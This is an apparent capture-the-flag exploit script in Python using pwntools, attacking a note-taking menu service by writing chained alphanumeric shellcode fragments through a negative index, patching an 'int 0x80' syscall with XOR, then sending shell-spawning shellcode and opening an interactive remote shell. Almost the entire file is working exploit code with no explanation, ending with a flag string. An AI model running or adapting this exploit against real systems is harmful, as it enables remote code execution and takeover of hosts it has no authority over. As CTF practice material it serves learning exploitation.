#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
if not os.path.exists(prog):
    log.warning('{}: No such file or directory'.format(prog))
else:
    elf = ELF(prog); context.word_size = elf.elfclass

def add_note(idx, name):
    r.sendlineafter('choice :', '1')
    r.sendlineafter('Index :', str(idx))
    r.recvuntil('Name :')
    r.sendline(name, 8)

def del_note(idx):
    r.sendlineafter('choice :', '3')
    r.sendlineafter('Index :', str(idx))
    
def exit():
    r.sendlineafter('choice :', '4')
    

def fuck(exp, idx=0, nop='G', jmp='u'):
    exp = exp.ljust(6, nop) + jmp + 'H'
    add_note(idx, exp)
    for i in range(4):
        add_note(0, '')

r = remote(HOST, PORT)

log.info('prepare_registers')
fuck(asm('push eax; pop ecx; push edi; pop eax'), -27)
fuck(asm('xor eax, 0x35357035'))
fuck(asm('xor eax, 0x35355035'))
fuck(asm('push eax; pop edx; push 0x30; pop eax;'))
fuck(asm('xor al, 0x30;'+'push eax;'*4), jmp='t')
fuck(asm('push ecx; push edx; popad; dec edx'))

log.info('patch int 0x80')
fuck(asm('push ebx; pop ecx'))
fuck(asm('dec ecx;'*6))
fuck(asm('dec ecx;'*6))
fuck(asm('dec ecx;'*6))
fuck(asm('dec ecx;'*6))
fuck(asm('push edx; pop eax; xor al, 0x73'))
fuck(asm('xor [esi+2*ecx+0x30], al'))
fuck(asm('push edx; pop eax; xor al, 0x4f'))
fuck(asm('xor [esi+2*ecx+0x31], al'))

log.info('read shellcode')
fuck(asm('push esi; pop ecx;' + 'inc ebx;'*3))
fuck(asm('push ebx; pop eax;' + 'dec ebx;'*3))

add_note(1, 'A0') # int 0x80
del_note(1)

r.send('\x90'*0x10 + asm(shellcraft.sh()))

r.interactive()

# CTF{Sh3llcoding_in_th3_n0t3_ch4in}
